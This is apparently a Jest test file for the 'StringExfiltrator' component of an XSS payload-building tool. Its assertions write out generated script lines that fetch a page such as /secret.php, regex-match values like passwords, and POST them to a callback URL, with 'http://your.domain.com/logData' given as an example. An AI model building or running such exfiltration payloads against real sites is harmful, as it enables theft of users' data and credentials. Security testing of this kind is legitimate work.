import { cook, init, render, validate } from './StringExfiltrator'
import { shallow } from 'enzyme'

describe('StringExfiltrator', () => {
  describe('.cook', () => {
    const createSubject = (opts = {}) => cook({
      id: 'instance_id',
      resource: 'http://127.0.0.1/secret.php',
      callbackUrl: 'http://127.0.0.1/process',
      pattern: opts.pattern,
      waitForResponse: opts.waitForResponse
    }, {
      payload: '__XSS_CHEF_ENTRY_POINT__'
    }).payload

    it('should use the AjaxRequest module to download the specified resource', () => {
      const payload = createSubject()

      expect(payload).toEqual(
        expect.stringContaining(
          `ajaxRequest('GET', 'http://127.0.0.1/secret.php', undefined, function (xhr) {`
        )
      )

      expect(payload).toEqual(
        expect.stringContaining(
          `var instance_id_data = xhr.response`
        )
      )
    })

    it('should use the AjaxRequest module to exfiltrate the data', () => {
      const payload = createSubject()

      expect(payload).toEqual(
        expect.stringContaining(
          `ajaxRequest('POST', 'http://127.0.0.1/process', 'data=' + encodeURIComponent(instance_id_data), instance_id_cb)`
        )
      )
    })

    describe('if a pattern is specified', () => {
      it('should override the data to be exfiltrated with the result of the regex match', () => {
        const payload = createSubject({
          pattern: `value="escape 'this'"`
        })

        expect(payload).toEqual(
          expect.stringContaining(
            `var instance_id_data = xhr.response.match(new RegExp('value="escape \\'this\\'"'))[0]`
          )
        )
      })
    })

    describe('if the "wait for request to finish" option is enabled', () => {
      it('should place the next entry point in the exfiltration callback', () => {
        const payload = createSubject({
          waitForResponse: true
        })

        expect(payload).toEqual(
          expect.stringContaining(
            `var instance_id_cb = function () { __XSS_CHEF_ENTRY_POINT__ }`
          )
        )

        expect(payload).not.toMatch(/__XSS_CHEF_ENTRY_POINT__$/)
      })
    })

    describe('if the "wait for request to finish" option is not enabled', () => {
      it('should place the next entry point at the end of the script', () => {
        const payload = createSubject({
          waitForResponse: false
        })

        expect(payload).toEqual(
          expect.stringContaining(
            `var instance_id_cb = function () { }`
          )
        )

        expect(payload).toMatch(/__XSS_CHEF_ENTRY_POINT__$/)
      })
    })
  })

  describe('.init', () => {
    it('should define {callbackUrl}', () => {
      expect(init().callbackUrl).toBeDefined()
    })

    it('should define {resource}', () => {
      expect(init().resource).toBeDefined()
    })

    it('should default {waitForResponse} to `true`', () => {
      expect(init().waitForResponse).toBe(true)
    })
  })

  describe('.render', () => {
    const setRecipeProperty = jest.fn()
    const instance = {
      id: 'instance_id',
      callbackUrl: 'callback URL'
    }

    it('should render a RecipeTextField for the callback URL`', () => {
      const wrapper = shallow(render(instance, setRecipeProperty))
      const textField = wrapper.find('RecipeTextField[bindTo="callbackUrl"]')
      expect(textField).toHaveLength(1)
      expect(textField.props()).toEqual({
        bindTo: 'callbackUrl',
        instance: instance,
        label: 'Callback URL',
        placeholder: 'Example: http://your.domain.com/logData',
        setRecipeProperty: setRecipeProperty
      })
    })

    it('should render a RecipeTextField for the pattern`', () => {
      const wrapper = shallow(render(instance, setRecipeProperty))
      const textField = wrapper.find('RecipeTextField[bindTo="pattern"]')
      expect(textField).toHaveLength(1)
      expect(textField.props()).toEqual({
        bindTo: 'pattern',
        instance: instance,
        label: 'Pattern to Match',
        placeholder: 'Example: password="[a-zA-z0-9]+?"',
        setRecipeProperty: setRecipeProperty
      })
    })

    it('should render a RecipeTextField for the resource path`', () => {
      const wrapper = shallow(render(instance, setRecipeProperty))
      const textField = wrapper.find('RecipeTextField[bindTo="resource"]')
      expect(textField).toHaveLength(1)
      expect(textField.props()).toEqual({
        bindTo: 'resource',
        instance: instance,
        label: 'Resource',
        placeholder: 'Example: /secret.php',
        setRecipeProperty: setRecipeProperty
      })
    })

    it('should render a checkbox bound to `instance.waitForResponse`', () => {
      const wrapper = shallow(render(instance, setRecipeProperty))
      const field = wrapper.find('RecipeCheckBox[bindTo="waitForResponse"]')
      expect(field).toHaveLength(1)
      expect(field.props()).toEqual({
        bindTo: 'waitForResponse',
        instance: instance,
        label: 'Halt next operation until response is received',
        setRecipeProperty: setRecipeProperty
      })
    })
  })

  describe('.validate', () => {
    describe('if `instance.callbackUrl` is empty', () => {
      it('should return false', () => {
        const valid = validate({
          callbackUrl: '',
          resource: '/'
        })
        expect(valid).toBe(false)
      })
    })

    describe('if `instance.resource` is empty', () => {
      it('should return false', () => {
        const valid = validate({
          callbackUrl: 'http://127.0.0.1',
          resource: ''
        })
        expect(valid).toBe(false)
      })
    })

    describe('if all checks pass', () => {
      it('should return true', () => {
        const valid = validate({
          callbackUrl: 'http://127.0.0.1',
          resource: '/'
        })

        expect(valid).toBe(true)
      })
    })
  })
})
